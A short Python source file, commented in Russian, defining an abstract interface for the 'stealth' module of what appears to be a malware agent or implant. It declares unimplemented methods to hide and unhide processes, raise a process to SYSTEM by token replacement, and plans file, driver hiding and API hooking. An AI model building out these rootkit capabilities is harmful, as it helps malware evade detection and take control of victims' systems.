# Интерфейс для взаимодействия модуля Stealth с ядром агента

from abc import ABC, abstractmethod
from typing import Optional, Tuple

class StealthInterface(ABC):
    """Абстрактный интерфейс для управления stealth-функциями."""

    @abstractmethod
    def hide_process(self, process_id: int) -> Tuple[bool, str]:
        """Скрывает процесс с указанным PID.

        Returns:
            Кортеж (успех: bool, сообщение: str).
        """
        pass

    @abstractmethod
    def unhide_process(self, process_id: int) -> Tuple[bool, str]:
        """Показывает ранее скрытый процесс.

        Returns:
            Кортеж (успех: bool, сообщение: str).
        """
        pass

    @abstractmethod
    def elevate_process_token(self, process_id: int) -> Tuple[bool, str]:
        """Повышает привилегии процесса до SYSTEM (через замену токена).

        Returns:
            Кортеж (успех: bool, сообщение: str).
        """
        pass

    # TODO: Добавить другие методы (скрытие файлов/драйверов, API hooking control и т.д.) 